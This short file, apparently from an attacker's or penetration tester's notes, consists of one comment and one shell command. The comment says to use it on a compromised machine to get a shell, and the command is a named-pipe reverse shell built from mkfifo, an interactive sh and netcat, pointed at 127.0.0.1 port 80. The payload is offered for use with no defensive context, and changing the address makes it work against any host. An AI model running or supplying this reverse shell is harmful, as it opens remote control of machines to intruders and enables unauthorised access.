#This shell works on the target machine. If you compromise a machine, use this to get a shell on the compromised machine
rm -f /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe | sh -i 2>&1 | nc 127.0.0.1 80 > /tmp/pipe;
